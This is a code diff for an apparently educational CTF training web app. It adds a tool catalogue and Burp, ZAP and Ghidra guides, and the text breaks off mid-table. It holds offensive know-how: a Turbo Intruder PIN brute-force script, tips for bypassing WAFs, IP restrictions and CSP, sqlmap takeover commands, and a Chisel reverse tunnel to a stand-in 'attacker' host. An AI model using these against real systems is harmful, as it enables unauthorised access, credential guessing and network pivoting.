@@ -15,6 +15,8 @@ const state = {
   theme: localStorage.getItem('atlas-theme') || 'dark',
   moduleQuery: localStorage.getItem('atlas-module-query') || '',
   curriculumModule: null,
+  toolTab: 'overview',
+  playbookTab: 'universal',
   casebookTab: 'all',
   casebookQuery: '',
   hackquestSeasonFilter: 'all',
@@ -43,13 +45,13 @@ function esc(s) {
 function getChapterForConcept(domainId, conceptIndex, conceptTitle) {
   const map = {
     'foundations': 'foundations-threat-model',
-    'linux': (conceptIndex === 2 || conceptIndex === 5) ? 'linux-pipelines' : (conceptIndex === 3 ? 'linux-proc-ipc' : 'linux-vfs'),
+    'linux': (conceptIndex === 4) ? 'linux-mastery-privesc' : ((conceptIndex === 2 || conceptIndex === 5) ? 'linux-pipelines' : (conceptIndex === 3 ? 'linux-proc-ipc' : 'linux-vfs')),
     'networking': (conceptIndex === 3) ? 'networking-dns' : ((conceptIndex === 4 || conceptIndex === 5) ? 'networking-nmap' : 'networking-tcp'),
-    'web': (conceptIndex === 2 || conceptIndex === 5) ? 'web-auth-jwt' : (conceptIndex === 4 ? 'web-xss-csp' : 'web-sqli-ast'),
+    'web': (conceptIndex === 1) ? 'web-start-to-end' : ((conceptIndex === 2 || conceptIndex === 5) ? 'web-auth-jwt' : (conceptIndex === 4 ? 'web-xss-csp' : 'web-sqli-ast')),
     'crypto': (conceptIndex === 1 || conceptIndex === 2) ? 'crypto-classical' : (conceptIndex === 4 ? 'crypto-rsa' : 'crypto-aes'),
     'forensics': (conceptIndex === 4) ? 'forensics-pcap' : ((conceptIndex === 3 || conceptIndex === 5) ? 'forensics-volatility' : 'forensics-disk-fs'),
-    'reverse': (conceptIndex === 2 || conceptIndex === 4) ? 'reverse-x86-asm' : (conceptIndex === 3 ? 'reverse-anti-debug' : 'reverse-ghidra'),
-    'pwn': (conceptIndex === 4 || conceptIndex === 5) ? 'pwn-fmtstr' : (conceptIndex === 2 ? 'pwn-heap' : 'pwn-rop'),
+    'reverse': (conceptIndex === 1 || conceptIndex === 5) ? 'reverse-start-to-end' : ((conceptIndex === 2 || conceptIndex === 4) ? 'reverse-x86-asm' : (conceptIndex === 3 ? 'reverse-anti-debug' : 'reverse-ghidra')),
+    'pwn': (conceptIndex === 1 || conceptIndex === 3) ? 'pwn-start-to-end' : ((conceptIndex === 4 || conceptIndex === 5) ? 'pwn-fmtstr' : (conceptIndex === 2 ? 'pwn-heap' : 'pwn-rop')),
     'osint': 'osint-recon',
     'stego': 'stego-deep',
     'mobile-cloud': (conceptIndex >= 4) ? 'cloud-k8s-iam' : 'cloud-docker-escape',
@@ -478,28 +480,28 @@ const domains = [
 ];
 
 const tools = [
-  {name:'Nmap',cat:'Network',why:'Discovery, port scanning and service enumeration. Start with localhost or a lab target.',linux:'nmap -sV 127.0.0.1',windows:'nmap -sV 127.0.0.1',mac:'nmap -sV 127.0.0.1',url:'https://nmap.org/book/'},
-  {name:'Wireshark',cat:'Network / Forensics',why:'Interactive packet inspection, streams, filters and protocol dissection.',linux:'wireshark',windows:'wireshark',mac:'wireshark',url:'https://www.wireshark.org/docs/wsug_html/'},
-  {name:'tcpdump',cat:'Network',why:'Lightweight packet capture and filtering from the command line.',linux:'tcpdump -i lo',windows:'Use Wireshark/Npcap capture',mac:'sudo tcpdump -i lo0',url:'https://www.tcpdump.org/'},
-  {name:'curl',cat:'Web',why:'Make and inspect HTTP requests without hiding the protocol details.',linux:'curl -i http://127.0.0.1:3000/',windows:'curl.exe -i http://127.0.0.1:3000/',mac:'curl -i http://127.0.0.1:3000/',url:'https://curl.se/docs/'},
-  {name:'Burp Suite',cat:'Web',why:'Proxy, inspect and replay application requests in authorized labs.',linux:'Launch Burp → Proxy → browser through 127.0.0.1',windows:'Launch Burp → Proxy → browser through 127.0.0.1',mac:'Launch Burp → Proxy → browser through 127.0.0.1',url:'https://portswigger.net/burp'},
-  {name:'OWASP ZAP',cat:'Web',why:'Open-source web proxy/scanner for learning and authorized application assessment.',linux:'zap.sh',windows:'zaproxy.exe',mac:'open /Applications/OWASP\\ ZAP.app',url:'https://www.zaproxy.org/'},
-  {name:'Ghidra',cat:'Reverse',why:'Disassembly/decompilation and binary exploration across platforms.',linux:'./ghidraRun',windows:'ghidraRun.bat',mac:'./ghidraRun',url:'https://github.com/NationalSecurityAgency/ghidra'},
-  {name:'gdb + extensions',cat:'Pwn / Reverse',why:'Debug local binaries, inspect registers/memory and validate hypotheses.',linux:'gdb ./binary',windows:'gdb ./binary (WSL/MSYS2)',mac:'lldb ./binary  # or gdb via package manager',url:'https://sourceware.org/gdb/'},
-  {name:'pwntools',cat:'Pwn',why:'Python toolkit for packing, parsing and process interaction in CTFs.',linux:'python3 -m pip install --user pwntools',windows:'python -m pip install --user pwntools',mac:'python3 -m pip install --user pwntools',url:'https://docs.pwntools.com/'},
-  {name:'CyberChef',cat:'General / Encoding',why:'Visual workbench for decoding, transformations and data inspection.',linux:'Open the web app / self-host the repo',windows:'Open the web app / self-host the repo',mac:'Open the web app / self-host the repo',url:'https://github.com/gchq/CyberChef'},
-  {name:'file / xxd / strings',cat:'Forensics',why:'Fast first-look triage for unknown files, bytes and printable data.',linux:'file sample.bin && xxd sample.bin | head && strings sample.bin | head',windows:'Use PowerShell Format-Hex; strings.exe is available via Sysinternals/other toolsets',mac:'file sample.bin && xxd sample.bin | head && strings sample.bin | head',url:'https://man7.org/linux/man-pages/'},
-  {name:'jq',cat:'Data / APIs',why:'Parse, filter and transform JSON cleanly.',linux:'jq ".items[] | .name" data.json',windows:'jq ".items[] | .name" data.json',mac:'jq ".items[] | .name" data.json',url:'https://jqlang.github.io/jq/'},
-  {name:'dig / nslookup',cat:'DNS / Network',why:'Inspect DNS records, servers, TTLs and resolution behavior.',linux:'dig example.test A',windows:'nslookup -type=A example.test',mac:'dig example.test A',url:'https://bind9.readthedocs.io/'},
-  {name:'git',cat:'Dev / Forensics',why:'History, branches and object metadata can expose how a project evolved.',linux:'git log --oneline --decorate --all',windows:'git log --oneline --decorate --all',mac:'git log --oneline --decorate --all',url:'https://git-scm.com/doc'},
-  {name:'hashcat',cat:'Crypto / Passwords',why:'Offline password-audit and cracking tool for hashes you are authorized to test.',linux:'hashcat --example-hashes',windows:'hashcat.exe --example-hashes',mac:'hashcat --example-hashes',url:'https://hashcat.net/hashcat/'},
-  {name:'OpenSSL CLI',cat:'Crypto / PKI',why:'Inspect certificates and test cryptographic primitives and encodings locally.',linux:'openssl x509 -in cert.pem -text -noout',windows:'openssl x509 -in cert.pem -text -noout',mac:'openssl x509 -in cert.pem -text -noout',url:'https://docs.openssl.org/'},
-  {name:'Python',cat:'Automation',why:'Glue language for parsing, encoding, protocol reasoning and repeatable solves.',linux:'python3',windows:'py',mac:'python3',url:'https://docs.python.org/3/'},
-  {name:'YARA',cat:'Forensics / Detection',why:'Pattern-matching rules for identifying files and behaviors in controlled samples.',linux:'yara rule.yar sample.bin',windows:'yara64.exe rule.yar sample.bin',mac:'yara rule.yar sample.bin',url:'https://yara.readthedocs.io/'},
-  {name:'Binwalk',cat:'Forensics',why:'Identify and extract embedded content from firmware-like or compound files.',linux:'binwalk sample.bin',windows:'Use container/WSL or Python packaging',mac:'binwalk sample.bin',url:'https://github.com/ReFirmLabs/binwalk'},
-  {name:'FFmpeg',cat:'Media / Forensics',why:'Inspect and transform audio/video containers while preserving evidence copies.',linux:'ffprobe sample.mp4',windows:'ffprobe.exe sample.mp4',mac:'ffprobe sample.mp4',url:'https://ffmpeg.org/ffprobe.html'},
-  {name:'SQLite CLI',cat:'Forensics / Web',why:'Inspect embedded application databases and challenge artifacts.',linux:'sqlite3 app.db',windows:'sqlite3.exe app.db',mac:'sqlite3 app.db',url:'https://sqlite.org/cli.html'},
-  {name:'ripgrep',cat:'General',why:'Fast recursive text search across source trees, extracted files and notes.',linux:'rg -n "flag|token|password" .',windows:'rg -n "flag|token|password" .',mac:'rg -n "flag|token|password" .',url:'https://github.com/BurntSushi/ripgrep'}
+  {name:'Burp Suite Community',cat:'Web / Proxy',why:'The industry-standard intercepting proxy for mapping web attack surfaces, testing SQLi/XSS/SSRF, and replaying modified HTTP/S requests.',linux:'burpsuite',windows:'burpsuite.exe',mac:'open -a Burp\ Suite\ Community\ Edition',url:'https://portswigger.net/burp'},
+  {name:'OWASP ZAP',cat:'Web / Scanner',why:'Feature-rich open-source proxy and automated security scanner without rate limits or commercial paywalls on fuzzing.',linux:'zap.sh',windows:'zaproxy.exe',mac:'open /Applications/OWASP\ ZAP.app',url:'https://www.zaproxy.org/'},
+  {name:'ffuf',cat:'Web / Discovery',why:'Blazing-fast web fuzzer written in Go. Indispensable for discovering hidden files, directories, virtual hosts, and API parameters.',linux:'ffuf -u http://127.0.0.1:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',windows:'ffuf.exe -u http://127.0.0.1:8000/FUZZ -w wordlist.txt',mac:'ffuf -u http://127.0.0.1:8000/FUZZ -w wordlist.txt',url:'https://github.com/ffuf/ffuf'},
+  {name:'sqlmap',cat:'Web / Database',why:'Automated SQL injection detection and database takeover tool. Supports boolean, time-based, error, and UNION extraction.',linux:'sqlmap -u "http://127.0.0.1/item?id=1" --batch --dbs',windows:'python sqlmap.py -u "http://127.0.0.1/item?id=1" --batch --dbs',mac:'sqlmap -u "http://127.0.0.1/item?id=1" --batch --dbs',url:'https://sqlmap.org/'},
+  {name:'Ghidra',cat:'Reverse Engineering',why:'NSA software reverse engineering suite with powerful multi-architecture Sleigh decompiler, P-Code IR, and binary patching.',linux:'./ghidraRun',windows:'ghidraRun.bat',mac:'./ghidraRun',url:'https://github.com/NationalSecurityAgency/ghidra'},
+  {name:'GDB + GEF',cat:'Pwn / Debugging',why:'GNU Debugger enhanced with GEF (GDB Enhanced Features) for exploit developers: telescope, pattern create/offset, checksec, heap.',linux:'gdb -q ./binary',windows:'gdb ./binary (via WSL2)',mac:'lldb ./binary',url:'https://gef.blah.cat/'},
+  {name:'pwntools',cat:'Pwn / Automation',why:'Essential Python CTF exploit development library providing cyclic patterns, ELF parsing, ROP generation, and socket I/O.',linux:'python3 -m pip install --user pwntools',windows:'python -m pip install --user pwntools (WSL)',mac:'python3 -m pip install --user pwntools',url:'https://docs.pwntools.com/'},
+  {name:'Z3 Theorem Prover',cat:'Reverse / Crypto',why:'High-performance SMT solver by Microsoft Research. Inverts complex bitwise XOR, modular arithmetic, and constraint systems.',linux:'python3 -m pip install z3-solver',windows:'python -m pip install z3-solver',mac:'python3 -m pip install z3-solver',url:'https://github.com/Z3Prover/z3'},
+  {name:'Nmap',cat:'Network Recon',why:'Network discovery, active port scanning, OS fingerprinting, and NSE vulnerability scanning.',linux:'nmap -sV -sC -p- 127.0.0.1',windows:'nmap -sV -sC -p- 127.0.0.1',mac:'nmap -sV -sC -p- 127.0.0.1',url:'https://nmap.org/book/'},
+  {name:'Wireshark',cat:'Network / Forensics',why:'Interactive deep packet inspection, TCP stream reassembly, TLS session decryption, and protocol dissection.',linux:'wireshark',windows:'wireshark.exe',mac:'open /Applications/Wireshark.app',url:'https://www.wireshark.org/docs/wsug_html/'},
+  {name:'tcpdump',cat:'Network / CLI',why:'Lightweight command-line packet sniffer for raw PCAP capture and protocol filtering.',linux:'tcpdump -i any -nn -s0 -w capture.pcap',windows:'Use Wireshark/Npcap',mac:'sudo tcpdump -i en0 -w capture.pcap',url:'https://www.tcpdump.org/'},
+  {name:'curl',cat:'Web / Automation',why:'Swiss-army knife for raw HTTP requests, custom headers, cookies, proxies, and multi-part data submission.',linux:'curl -i -X POST -d "param=val" http://127.0.0.1/',windows:'curl.exe -i -X POST -d "param=val" http://127.0.0.1/',mac:'curl -i -X POST -d "param=val" http://127.0.0.1/',url:'https://curl.se/docs/'},
+  {name:'CyberChef',cat:'Encoding / Crypto',why:'The Cyber Swiss Army Knife for multi-stage decoding, hashing, compression, de-obfuscation, and data manipulation.',linux:'Open web app or: docker run -p 8080:80 mpepping/cyberchef',windows:'Open web app in browser',mac:'Open web app in browser',url:'https://gchq.github.io/CyberChef/'},
+  {name:'John the Ripper',cat:'Crypto / Passwords',why:'Fast password hash cracker supporting hundreds of hash formats, custom mutation rules, and encrypted archives.',linux:'john --wordlist=rockyou.txt hashes.txt',windows:'john.exe --wordlist=rockyou.txt hashes.txt',mac:'john --wordlist=rockyou.txt hashes.txt',url:'https://www.openwall.com/john/'},
+  {name:'hashcat',cat:'Crypto / GPU',why:'World fastest GPU-accelerated hash recovery utility supporting rule-based attacks, mask brute-force, and hybrid modes.',linux:'hashcat -m 0 -a 0 hashes.txt rockyou.txt',windows:'hashcat.exe -m 0 -a 0 hashes.txt rockyou.txt',mac:'hashcat -m 0 -a 0 hashes.txt rockyou.txt',url:'https://hashcat.net/hashcat/'},
+  {name:'Binwalk',cat:'Forensics / Firmware',why:'Firmware analysis tool to scan raw binary images, identify embedded compressed file systems, and extract archives.',linux:'binwalk -Me firmware.bin',windows:'Use WSL2 / Docker',mac:'binwalk -Me firmware.bin',url:'https://github.com/ReFirmLabs/binwalk'},
+  {name:'Volatility 3',cat:'Forensics / Memory',why:'Advanced memory forensics framework for analyzing volatile RAM dumps (processes, DLLs, network sockets, rootkits).',linux:'python3 vol.py -f memdump.raw windows.pslist',windows:'python vol.py -f memdump.raw windows.pslist',mac:'python3 vol.py -f memdump.raw windows.pslist',url:'https://github.com/volatilityfoundation/volatility3'},
+  {name:'steghide & zsteg',cat:'Steganography',why:'Steghide extracts data hidden in JPEG/BMP/WAV files; zsteg scans PNG/BMP for LSB data across color channels.',linux:'steghide extract -sf image.jpg; zsteg -a image.png',windows:'Use WSL2 or steghide.exe',mac:'steghide extract -sf image.jpg; zsteg -a image.png',url:'https://github.com/zed-0xff/zsteg'},
+  {name:'exiftool',cat:'Forensics / OSINT',why:'Read, write, and manipulate EXIF, IPTC, and XMP metadata in images, PDFs, audio, and office documents.',linux:'exiftool -a -u -g1 image.jpg',windows:'exiftool.exe -a -u -g1 image.jpg',mac:'exiftool -a -u -g1 image.jpg',url:'https://exiftool.org/'},
+  {name:'Impacket',cat:'Active Directory / Net',why:'Collection of Python classes for working with network protocols (SMB, Kerberos, MSRPC, LDAP) for Windows penetration testing.',linux:'python3 -m pip install impacket',windows:'python -m pip install impacket',mac:'python3 -m pip install impacket',url:'https://github.com/fortra/impacket'},
+  {name:'Chisel',cat:'Pivoting / Tunneling',why:'Fast TCP/UDP tunnel over HTTP secured via SSH. Essential for pivoting through compromised CTF pivot hosts to internal subnets.',linux:'chisel server --port 8000 --reverse',windows:'chisel.exe client attacker:8000 R:socks',mac:'chisel server --port 8000 --reverse',url:'https://github.com/jpillora/chisel'},
+  {name:'ripgrep (rg)',cat:'CLI / Search',why:'Lightning-fast recursive grep honoring .gitignore. Instant discovery of hardcoded flags, credentials, and API routes.',linux:'rg -n -i "flag{|password|secret" .',windows:'rg.exe -n -i "flag{|password|secret" .',mac:'rg -n -i "flag{|password|secret" .',url:'https://github.com/BurntSushi/ripgrep'}
 ];
 
 const challenges = [
@@ -577,7 +579,7 @@ function setView(view) {
   document.querySelectorAll('.nav-item').forEach(b => b.classList.toggle('active', b.dataset.view === view));
   document.getElementById('breadcrumbs').textContent = {
     dashboard:'Dashboard', path:'Learning path', modules:'Learning modules', domains:'Learning paths',
-    tools:'Tool lab', labs:'Micro-labs', playbook:'Methodology', casebook:'Casebook',
+    tools:'Tool Academy', labs:'Micro-labs', playbook:'Lifecycles & Playbook', casebook:'Casebook',
     library:'Reference vault', glossary:'Glossary', intel:'Live intel', curriculum:'Curriculum',
     tricks:'Tricks & tips', workbench:'Cyber workbench'
   }[view] || 'CTF Atlas';
@@ -1076,10 +1078,522 @@ function domainDetailHTML(id) {
 
 function toolsHTML() {
   const os = state.os;
-  return `<div class="section-head"><div><h2>Tool lab</h2><p>Command examples for your OS. Always use against systems you own or are authorized to test.</p></div>
-  <div class="os-tabs">${['linux','windows','mac'].map(o=>`<button class="os-btn${os===o?' active':''}" data-os="${o}">${o.toUpperCase()}</button>`).join('')}</div>
+  const tab = state.toolTab || 'overview';
+
+  return `
+  <div class="section-head">
+    <div>
+      <div class="eyebrow">ACADEMY // TOP CTF TOOLS &amp; WORKFLOW MASTERY</div>
+      <h2>Master Tool Academy &amp; Command Lab</h2>
+      <p>Definitive guides to the top hacking tools (Burp Suite, OWASP ZAP, Ghidra, GDB+GEF, ffuf/DirBuster) from zero to pro, complete with rate-limit bypasses, binary patching, and the 'Quick Flag' decision matrix.</p>
+    </div>
+    <div class="tag-row">
+      <span class="tag accent">${tools.length} arsenal tools</span>
+      <span class="tag success">up-to-date 2026</span>
+      <span class="tag warn">ethical lab scope</span>
+    </div>
   </div>
-  <div class="tool-grid">${tools.map(t=>`<div class="tool-card"><div class="card-top"><h3>${esc(t.name)}</h3><span class="tool-os">${esc(t.cat)}</span></div><p class="why">${esc(t.why)}</p><pre><code>${esc(t[os]||t.linux)}</code></pre>${t.url?`<a class="btn outline" href="${esc(t.url)}" target="_blank" rel="noopener" style="margin-top:8px;font-size:11px">Docs →</a>`:''}</div>`).join('')}</div>`;
+
+  <div class="os-tabs" style="margin-bottom:18px">
+    ${[
+      ['overview', 'All Tools Arsenal (' + tools.length + ')'],
+      ['burp', 'Burp Suite (Community to Pro Master)'],
+      ['zap', 'OWASP ZAP Masterclass'],
+      ['ghidra', 'Ghidra Reverse Engineering'],
+      ['pwn', 'GDB + GEF & Pwntools'],
+      ['dirbust', 'Content Discovery (ffuf / Gobuster)'],
+      ['quickflag', '🎯 Quick Flag Decision Matrix']
+    ].map(([key, label]) => `
+      <button class="os-btn${tab === key ? ' active' : ''}" data-tool-tab="${key}">${label}</button>
+    `).join('')}
+  </div>
+
+  ${tab === 'overview' ? `
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px">
+      <p style="color:#aeb6c5;font-size:13px;margin:0">Displaying commands optimized for your operating system:</p>
+      <div class="os-tabs" style="margin:0">
+        ${['linux','windows','mac'].map(o=>`<button class="os-btn${os===o?' active':''}" data-os="${o}">${o.toUpperCase()}</button>`).join('')}
+      </div>
+    </div>
+    <div class="tool-grid">
+      ${tools.map(t=>`
+        <div class="tool-card">
+          <div class="card-top">
+            <h3>${esc(t.name)}</h3>
+            <span class="tool-os">${esc(t.cat)}</span>
+          </div>
+          <p class="why">${esc(t.why)}</p>
+          <pre><code>${esc(t[os]||t.linux)}</code></pre>
+          <div style="display:flex;gap:8px;margin-top:10px">
+            ${t.url ? `<a class="btn outline" href="${esc(t.url)}" target="_blank" rel="noopener" style="font-size:11px;padding:4px 8px">Docs &rarr;</a>` : ''}
+            ${t.name.includes('Burp') ? `<button class="btn outline" data-tool-tab="burp" style="font-size:11px;padding:4px 8px">Master Guide &rarr;</button>` : ''}
+            ${t.name.includes('ZAP') ? `<button class="btn outline" data-tool-tab="zap" style="font-size:11px;padding:4px 8px">Master Guide &rarr;</button>` : ''}
+            ${t.name.includes('Ghidra') ? `<button class="btn outline" data-tool-tab="ghidra" style="font-size:11px;padding:4px 8px">Master Guide &rarr;</button>` : ''}
+            ${t.name.includes('GDB') ? `<button class="btn outline" data-tool-tab="pwn" style="font-size:11px;padding:4px 8px">Master Guide &rarr;</button>` : ''}
+            ${t.name.includes('ffuf') ? `<button class="btn outline" data-tool-tab="dirbust" style="font-size:11px;padding:4px 8px">Master Guide &rarr;</button>` : ''}
+          </div>
+        </div>
+      `).join('')}
+    </div>
+  ` : ''}
+
+  ${tab === 'burp' ? `
+    <article class="writeup-card">
+      <div class="card-top">
+        <div>
+          <span class="tag accent">WEB EXPLOITATION</span>
+          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">Burp Suite Community Edition Masterclass (Zero to Pro)</h3>
+          <p style="color:#aeb6c5;font-size:13px">How to configure, optimize, and wield Burp Suite Community Edition like a seasoned professional, including cracking rate limits via Turbo Intruder, match & replace automation, and free collaborator alternatives.</p>
+        </div>
+        <button class="btn" data-textbook="web-start-to-end">📖 Read Web Lifecycle Chapter</button>
+      </div>
+
+      <div style="margin:20px 0;background:#0d0f18;border:1px solid var(--border);border-radius:6px;padding:16px">
+        <h4 style="color:var(--green);font-size:13px;letter-spacing:0.08em;text-transform:uppercase;margin:0 0 10px">BURP SUITE ARCHITECTURE &amp; INTERCEPT FLOW</h4>
+        <pre style="margin:0;color:#cdd6f4"><code>[Browser / Client (FoxyProxy: 127.0.0.1:8080)]
+       │
+       ▼
+[Burp Proxy Listener (Intercept On/Off)]
+       │
+       ├──► [Scope Filter: Drop noise &amp; telemetry (.google, .mozilla)]
+       ├──► [Match &amp; Replace Rules: Inject Bearer Tokens / Spoof IPs]
+       │
+       ▼
+[HTTP History / Target Site Map]
+       │
+       ├──► Send to [Repeater: Ctrl+R]  --> Manual request modification &amp; fuzzing
+       ├──► Send to [Turbo Intruder]     --> 10,000 req/sec rate-limit bypass
+       ├──► Send to [Decoder: Ctrl+Shift+D] --> Multi-stage URL/Base64/Hex transforms
+       └──► Send to [Comparer]          --> Word &amp; byte diff analysis of responses</code></pre>
+      </div>
+
+      <div class="grid cols-2" style="gap:16px;margin-bottom:20px">
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 8px">Stage 1: Setup &amp; Scope Configuration</h4>
+          <ol style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
+            <li><strong>FoxyProxy Setup:</strong> Add Firefox extension proxying HTTP/HTTPS traffic to <code>127.0.0.1:8080</code>.</li>
+            <li><strong>Install CA Certificate:</strong> Navigate to <code>http://burp/cert</code> in proxied browser, download <code>cacert.der</code>, and import into Firefox under <em>Settings &rarr; Certificates &rarr; Authorities &rarr; Trust this CA</em>.</li>
+            <li><strong>Target Scope Hygiene:</strong> Go to <em>Target &rarr; Scope</em>. Add <code>http://target-ctf.com.*</code>. Then in <em>Proxy &rarr; HTTP history</em>, click the filter bar and check <strong>Show only in-scope items</strong>. This removes 95% of background browser telemetry!</li>
+          </ol>
+        </div>
+
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 8px">Stage 2: Repeater Like a Pro</h4>
+          <ol style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
+            <li><strong>Essential Hotkeys:</strong> <code>Ctrl+R</code> sends selected request to Repeater. <code>Ctrl+Space</code> sends request immediately.</li>
+            <li><strong>Tab Organization:</strong> Double click tab titles to name them: <code>Auth Bypass</code>, <code>SSTI Test</code>, <code>Admin IDOR</code>. Right click to color code tabs.</li>
+            <li><strong>HTTP Protocol Downgrade:</strong> If backend WAF blocks requests, toggle <em>Change HTTP protocol</em> to HTTP/1.1 or HTTP/2.</li>
+            <li><strong>Chunked Transfer Encoding:</strong> Right click &rarr; <em>Change request method / Chunk transfer</em> to bypass signature-based WAFs.</li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="card" style="margin-bottom:20px">
+        <div class="card-top">
+          <h4 style="color:var(--green);margin:0">Stage 3: Turbo Intruder (Bypassing Community Edition Throttling)</h4>
+          <span class="tag accent">10,000 req/sec</span>
+        </div>
+        <p style="color:#aeb6c5;font-size:13px;margin:8px 0">Burp Community intentionally throttles Intruder to ~1 request per second. Bypass this completely by installing <strong>Turbo Intruder</strong> from the BApp Store (Extensions &rarr; BApp Store &rarr; Turbo Intruder). It uses custom Python scripts streaming requests over raw sockets.</p>
+        <pre><code># Turbo Intruder Python Script Template (Bypass Rate Limits)
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=15,
+                           requestsPerConnection=100,
+                           pipeline=True)
+    
+    # Brute-force 4-digit PINs (0000 - 9999) in under 3 seconds!
+    for i in range(10000):
+        engine.queue(target.req, str(i).zfill(4))
+
+def handleResponse(req, interesting):
+    # Only show responses that do NOT match failure conditions
+    if req.status == 200 and 'Invalid PIN' not in req.response:
+        table.add(req)</code></pre>
+      </div>
+
+      <div class="grid cols-2" style="gap:16px;margin-bottom:20px">
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 8px">Stage 4: Match &amp; Replace Rules</h4>
+          <p style="color:#aeb6c5;font-size:12px;margin:0 0 8px">Proxy &rarr; Proxy Settings &rarr; Match and Replace:</p>
+          <ul style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
+            <li><strong>Auto-Inject JWT:</strong> Match: <code>^$</code>, Replace: <code>Authorization: Bearer &lt;TOKEN&gt;</code>.</li>
+            <li><strong>Spoof Internal IP:</strong> Add <code>X-Forwarded-For: 127.0.0.1</code> and <code>X-Real-IP: 127.0.0.1</code> to bypass IP restrictions.</li>
+            <li><strong>Path Rewriting:</strong> Add <code>X-Original-URL: /admin</code> or <code>X-Rewrite-URL: /admin</code>.</li>
+            <li><strong>Strip Security Headers:</strong> Remove <code>Content-Security-Policy</code> to test XSS without CSP blocks.</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 8px">Stage 5: Free Out-of-Band (OOB) Testing</h4>
+          <p style="color:#aeb6c5;font-size:12px;margin:0 0 8px">Burp Collaborator requires Pro. Use these free tools for blind SSRF/SQLi/XXE:</p>
+          <ul style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
+            <li><strong>interactsh (Recommended):</strong> Run <code>interactsh-client -v</code> in your terminal. Get a free subdomain receiving DNS, HTTP, and SMTP pings instantly.</li>
+            <li><strong>webhook.site:</strong> Instant web-based HTTP request logger.</li>
+            <li><strong>requestrepo.com:</strong> Dedicated CTF tool for custom DNS and HTTP responses.</li>
+          </ul>
+        </div>
+      </div>
+    </article>
+  ` : ''}
+
+  ${tab === 'zap' ? `
+    <article class="writeup-card">
+      <div class="card-top">
+        <div>
+          <span class="tag accent">OPEN SOURCE PENTESTING</span>
+          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">OWASP ZAP (Zed Attack Proxy) Masterclass</h3>
+          <p style="color:#aeb6c5;font-size:13px">The premiere open-source web application security scanner. Zero rate limits, powerful automated spidering, scriptable authentication, and the built-in browser HUD.</p>
+        </div>
+      </div>
+
+      <div class="grid cols-3" style="gap:16px;margin:16px 0">
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 6px">1. Zero-Throttling Fuzzer</h4>
+          <p style="font-size:12px;color:#aeb6c5">Unlike Burp Community, ZAP's Fuzzer has <strong>zero commercial throttling</strong>. Highlight any parameter, right click &rarr; Fuzz, select a SecLists wordlist, and fire at 500+ threads simultaneously.</p>
+        </div>
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 6px">2. Interactive HUD Overlay</h4>
+          <p style="font-size:12px;color:#aeb6c5">ZAP features an in-browser Heads-Up Display (HUD). Test applications directly in Firefox or Chrome with floating panels showing alerts, spidering, and parameter modification.</p>
+        </div>
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 6px">3. Automated Headless CI/CD</h4>
+          <p style="font-size:12px;color:#aeb6c5">Run headless automated vulnerability sweeps in Docker or CLI during time-constrained tournaments: <code>zap.sh -cmd -quickurl http://target -quickout /tmp/report.html</code>.</p>
+        </div>
+      </div>
+
+      <div class="card">
+        <h4 style="color:var(--green);margin:0 0 8px">Step-by-Step ZAP CTF Workflow</h4>
+        <ol style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.7">
+          <li><strong>Context Definition:</strong> In the Sites tree, right click target domain &rarr; <em>Include in Context &rarr; Default Context</em>.</li>
+          <li><strong>Authentication Setup:</strong> Under Session Properties &rarr; Context &rarr; Authentication, select <em>Form-based Authentication</em> or <em>JSON-based Authentication</em>. Define login request and logged-in indicator pattern.</li>
+          <li><strong>Spider &amp; Ajax Spider:</strong> Run traditional Spider for static links, followed by Ajax Spider (using headless browser) to crawl JavaScript single-page applications (React/Vue/Angular).</li>
+          <li><strong>Active Scan:</strong> Launch Active Scan policy targeting specific vulnerability categories (e.g., High Priority: SQL Injection, Remote Code Execution, Path Traversal).</li>
+        </ol>
+      </div>
+    </article>
+  ` : ''}
+
+  ${tab === 'ghidra' ? `
+    <article class="writeup-card">
+      <div class="card-top">
+        <div>
+          <span class="tag accent">REVERSE ENGINEERING</span>
+          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">Ghidra Reverse Engineering from Scratch to Master</h3>
+          <p style="color:#aeb6c5;font-size:13px">NSA's software reverse engineering suite deconstructed: CodeBrowser layout, the 5 essential hotkeys for solving reversing challenges, binary patching, and Z3 SMT keygenning.</p>
+        </div>
+        <button class="btn" data-textbook="reverse-start-to-end">📖 Read Reversing Chapter</button>
+      </div>
+
+      <div class="cmd-table-wrap">
+        <table class="cmd-table">
+          <thead>
+            <tr>
+              <th>Hotkey</th>
+              <th>Action</th>
+              <th>Why It Wins CTF Challenges</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>G</code></td>
+              <td>Goto Address / Symbol</td>
+              <td>Instantly jump to <code>main</code>, PLT stubs (<code>strcmp</code>), or hex addresses found in strings/GDB.</td>
+            </tr>
+            <tr>
+              <td><code>L</code></td>
+              <td>Rename Variable / Function</td>
+              <td>Transforms cryptic <code>local_18</code> to <code>user_input</code> and <code>FUN_00401122</code> to <code>validate_key</code>. Decompiler output becomes human-readable C!</td>
+            </tr>
+            <tr>
+              <td><code>Ctrl + L</code></td>
+              <td>Retype Variable / Field</td>
+              <td>Convert <code>undefined4</code> to <code>char *</code> or custom structs. Resolves pointer arithmetic and array indexing automatically.</td>
+            </tr>
+            <tr>
+              <td><code>X</code></td>
+              <td>Cross-References (XREFs)</td>
+              <td>Find every location in the binary where a specific encrypted string or decryption key is referenced.</td>
+            </tr>
+            <tr>
+              <td><code>;</code> or <code>:</code></td>
+              <td>Add Comment</td>
